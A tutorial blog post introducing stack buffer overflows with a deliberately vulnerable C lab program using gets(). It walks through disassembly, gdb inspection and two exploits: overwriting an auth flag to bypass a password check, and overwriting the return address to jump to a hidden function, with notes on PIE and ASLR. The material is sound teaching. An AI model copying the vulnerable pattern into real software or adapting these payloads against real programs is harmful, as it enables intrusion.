---
title: Shattering the stack (0)
published: true
---

### Table of contents

* toc placeholder
{:toc}

### Introduction

When a program blindly copies data into a buffer without checking its size, it risks overrunning the buffer's capacity. This vulnerability can lead to various exploits, the most critical being the execution of arbitrary code. Attackers often exploit buffer overflows to alter a program's execution flow, allowing them to execute malicious code.

This post is an introduction to the world of buffer overflows. The source code can be found [here](https://github.com/gemesa/shadow-shell).

### vulnerable code

The following C code demonstrates a simple buffer overflow vulnerability due to the use of the unsafe `gets()` function:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// gets() was removed from the C11 standard
char* gets(char* str);

int authenticate(void)
{
    char buff[10];
    char cmd[10];
    int auth = 0;

    puts("enter the password:");
    gets(buff);
    
    if(strcmp(buff, "12345"))
    {
        puts("wrong password");
    }
    else
    {
        puts("correct password");
        auth = 1;

    }
    
    if(auth)
    {
        puts("authenticated");
        puts("your files:");
        strcpy(cmd, "ls");
        system(cmd);
    }

    return 0;
}

int main(void)
{
    authenticate();
    return 0;
}

void secret(void)
{
    puts("secret found!");
}
```

### exploit 0

Let's compile the binary and inspect the generated assembly code:

```
$ gcc lab/bof-server.c -g -o build/bof-server
...
$ objdump -d build/bof-server
...
0000000000401156 <authenticate>:
  401156:	55                   	push   %rbp
  401157:	48 89 e5             	mov    %rsp,%rbp
  40115a:	48 83 ec 20          	sub    $0x20,%rsp
  40115e:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
  401165:	bf 10 20 40 00       	mov    $0x402010,%edi
  40116a:	e8 c1 fe ff ff       	call   401030 <puts@plt>
  40116f:	48 8d 45 f2          	lea    -0xe(%rbp),%rax
  401173:	48 89 c7             	mov    %rax,%rdi
  401176:	e8 e5 fe ff ff       	call   401060 <gets@plt>
  40117b:	48 8d 45 f2          	lea    -0xe(%rbp),%rax
  40117f:	be 24 20 40 00       	mov    $0x402024,%esi
  401184:	48 89 c7             	mov    %rax,%rdi
  401187:	e8 c4 fe ff ff       	call   401050 <strcmp@plt>
  40118c:	85 c0                	test   %eax,%eax
  40118e:	74 0c                	je     40119c <authenticate+0x46>
  401190:	bf 2a 20 40 00       	mov    $0x40202a,%edi
  401195:	e8 96 fe ff ff       	call   401030 <puts@plt>
  40119a:	eb 11                	jmp    4011ad <authenticate+0x57>
  40119c:	bf 39 20 40 00       	mov    $0x402039,%edi
  4011a1:	e8 8a fe ff ff       	call   401030 <puts@plt>
  4011a6:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
  4011ad:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
  4011b1:	74 2d                	je     4011e0 <authenticate+0x8a>
  4011b3:	bf 4a 20 40 00       	mov    $0x40204a,%edi
  4011b8:	e8 73 fe ff ff       	call   401030 <puts@plt>
  4011bd:	bf 58 20 40 00       	mov    $0x402058,%edi
  4011c2:	e8 69 fe ff ff       	call   401030 <puts@plt>
  4011c7:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
  4011cb:	66 c7 00 6c 73       	movw   $0x736c,(%rax)
  4011d0:	c6 40 02 00          	movb   $0x0,0x2(%rax)
  4011d4:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
  4011d8:	48 89 c7             	mov    %rax,%rdi
  4011db:	e8 60 fe ff ff       	call   401040 <system@plt>
  4011e0:	b8 00 00 00 00       	mov    $0x0,%eax
  4011e5:	c9                   	leave
  4011e6:	c3                   	ret

00000000004011e7 <main>:
  4011e7:	55                   	push   %rbp
  4011e8:	48 89 e5             	mov    %rsp,%rbp
  4011eb:	e8 66 ff ff ff       	call   401156 <authenticate>
  4011f0:	b8 00 00 00 00       	mov    $0x0,%eax
  4011f5:	5d                   	pop    %rbp
  4011f6:	c3                   	ret
...
```

We can see that variable `auth` can be found right after `buffer` in the memory layout:

```
...
  40115e:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp) # auth
...
  40116f:	48 8d 45 f2          	lea    -0xe(%rbp),%rax # buffer
...
```

This is the first vulnerability we can exploit. We know that `buffer` is 10 characters (bytes) long so if we provide more than that we will overwrite `auth`.

No overflow (9 characters + NULL terminator which is automatically appended by `gets()`):

```
$ echo "012345678" | ./build/bof-server
enter the password:
wrong password
```

Overflow (10 character + NULL terminator):

```
$ echo "0123456789" | ./build/bof-server
enter the password:
wrong password
```

Note that in the case above we are already overwriting `auth` but with a NULL terminator (which is 0 in memory) so `if(auth)` still fails.

Overflow (11 character + NULL terminator):

```
$ echo "0123456789a" | ./build/bof-server
enter the password:
wrong password
authenticated
your files:
arsenal  build	Cargo.lock  Cargo.toml	lab  LICENSE  Makefile	README.md  target
```
Now we managed to overwrite `auth` with a non-zero value so we get authenticated even though we provide a wrong password.

We can verify this using `gdb`:

```
$ gdb build/bof-server
GNU gdb (GDB) Fedora Linux 13.2-6.fc38
...
(gdb) b main
Breakpoint 1 at 0x4011eb: file lab/bof-server.c, line 41.
(gdb) r
Starting program: /home/gemesa/git-repos/shadow-shell/build/bof-server
...
Breakpoint 1, main () at lab/bof-server.c:41
41	    authenticate();
Missing separate debuginfos, use: dnf debuginfo-install glibc-2.37-14.fc38.x86_64
(gdb) disas
Dump of assembler code for function main:
   0x00000000004011e7 <+0>:	push   %rbp
   0x00000000004011e8 <+1>:	mov    %rsp,%rbp
=> 0x00000000004011eb <+4>:	call   0x401156 <authenticate>
   0x00000000004011f0 <+9>:	mov    $0x0,%eax
   0x00000000004011f5 <+14>:	pop    %rbp
   0x00000000004011f6 <+15>:	ret
End of assembler dump.
(gdb) si
authenticate () at lab/bof-server.c:9
9	{
(gdb) disas
Dump of assembler code for function authenticate:
=> 0x0000000000401156 <+0>:	push   %rbp
   0x0000000000401157 <+1>:	mov    %rsp,%rbp
   0x000000000040115a <+4>:	sub    $0x20,%rsp
   0x000000000040115e <+8>:	movl   $0x0,-0x4(%rbp)
   0x0000000000401165 <+15>:	mov    $0x402010,%edi
   0x000000000040116a <+20>:	call   0x401030 <puts@plt>
   0x000000000040116f <+25>:	lea    -0xe(%rbp),%rax
   0x0000000000401173 <+29>:	mov    %rax,%rdi
   0x0000000000401176 <+32>:	call   0x401060 <gets@plt>
...
End of assembler dump.
(gdb) b *0x0000000000401176
Breakpoint 2 at 0x401176: file lab/bof-server.c, line 15.
(gdb) c
Continuing.
enter the password:

Breakpoint 2, 0x0000000000401176 in authenticate () at lab/bof-server.c:15
15	    gets(buff);
(gdb) i loc
buff = "\000\000\000\000\000\000\260\\\376", <incomplete sequence \367>
cmd = "\000\000\000\000\000\000\000\000\000"
auth = 0
(gdb) n
0123456789a
17	    if(strcmp(buff, "12345"))
(gdb) i loc
buff = "0123456789"
cmd = "\000\000\000\000\000\000\000\000\000"
auth = 97
(gdb) c
Continuing.
wrong password
authenticated
your files:
[Detaching after vfork from child process 31163]
arsenal  build	Cargo.lock  Cargo.toml	lab  LICENSE  Makefile	README.md  target
[Inferior 1 (process 30821) exited normally]
(gdb) quit

```

## exploit 1

If we check the generated assembly code we can see there is function `secret()` which is never called but still present in the binary:

```
$ objdump -d build/bof-server
...
00000000004011f7 <secret>:
  4011f7:	55                   	push   %rbp
  4011f8:	48 89 e5             	mov    %rsp,%rbp
  4011fb:	bf 64 20 40 00       	mov    $0x402064,%edi
  401200:	e8 2b fe ff ff       	call   401030 <puts@plt>
  401205:	90                   	nop
  401206:	5d                   	pop    %rbp
  401207:	c3                   	ret
...
```

If the code is compiled without `-fPIE -pie` (position independent code), then we can overwrite the return address pushed onto the stack (when `authenticate()` is called) to point to the address of `secret()`. If `-fPIE -pie` is passed to the compiler ASLR will randomize the addresses each time the binary is executed.

Now we just need to figure out where the return address is exactly on the stack:

```
...
00000000004011e7 <main>:
...
  4011eb:	e8 66 ff ff ff       	call   401156 <authenticate> # return address is pushed (8 bytes)
...
0000000000401156 <authenticate>:
  401156:	55                   	push   %rbp                  # rbp is pushed (8 bytes)
...
  40115e:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)       # auth (4 bytes)
...
  40116f:	48 8d 45 f2          	lea    -0xe(%rbp),%rax       # buffer (10 bytes)
...

```

We can see that we need to specify 22 bytes (10 + 4 + 8) in the first part of our payload before the address of `secret()`:

```
$ echo "aaaaaaaaaabbbbcccccccc\xf7\x11\x40\x00\x00\x00\x00\x00" | ./build/bof-server
enter the password:
wrong password
authenticated
your files:
arsenal  build	Cargo.lock  Cargo.toml	lab  LICENSE  Makefile	README.md  target
secret found!
zsh: done                              echo "aaaaaaaaaabbbbcccccccc\xf7\x11\x40\x00\x00\x00\x00\x00" | 
zsh: segmentation fault (core dumped)  ./build/bof-server
```

If `-fPIE -pie` is used during compilation and ASLR is activated, this vulnerability can not be easily exploited as you would need to guess the address (which will be randomized each time the binary is executed):

```
$ gcc lab/bof-server.c -g -o build/bof-server -fPIE -pie
...
$ objdump -d build/bof-server
...
0000000000001228 <secret>:
...
$ ./build/bof-server
enter the password:

```

Open a new terminal:

```
$ cat /proc/sys/kernel/randomize_va_space
2
$ # 2 means activated
$ ps a | grep bof-server
  34893 pts/1    S+     0:00 ./build/bof-server
...
$ cat /proc/34893/maps  
5642eefa0000-5642eefa1000 r--p 00000000 00:25 11545801                   /home/gemesa/git-repos/shadow-shell/build/bof-server
5642eefa1000-5642eefa2000 r-xp 00001000 00:25 11545801                   /home/gemesa/git-repos/shadow-shell/build/bof-server
5642eefa2000-5642eefa3000 r--p 00002000 00:25 11545801                   /home/gemesa/git-repos/shadow-shell/build/bof-server
5642eefa3000-5642eefa4000 r--p 00002000 00:25 11545801                   /home/gemesa/git-repos/shadow-shell/build/bof-server
5642eefa4000-5642eefa5000 rw-p 00003000 00:25 11545801                   /home/gemesa/git-repos/shadow-shell/build/bof-server
...
```

Without `-fPIE -pie` the addresses are the same every time:

```
$ ps a | grep bof-server                 
  35154 pts/1    S+     0:00 ./build/bof-server
...                                                                                                                  
$ cat /proc/35154/maps                   
00400000-00401000 r--p 00000000 00:25 11545797                           /home/gemesa/git-repos/shadow-shell/build/bof-server
00401000-00402000 r-xp 00001000 00:25 11545797                           /home/gemesa/git-repos/shadow-shell/build/bof-server
00402000-00403000 r--p 00002000 00:25 11545797                           /home/gemesa/git-repos/shadow-shell/build/bof-server
00403000-00404000 r--p 00002000 00:25 11545797                           /home/gemesa/git-repos/shadow-shell/build/bof-server
00404000-00405000 rw-p 00003000 00:25 11545797                           /home/gemesa/git-repos/shadow-shell/build/bof-server
...
```

References:
- [https://github.com/muhammet-mucahit/Security-Exercises](https://github.com/muhammet-mucahit/Security-Exercises)
- [https://lettieri.iet.unipi.it/hacking/aslr-pie.pdf](https://lettieri.iet.unipi.it/hacking/aslr-pie.pdf)
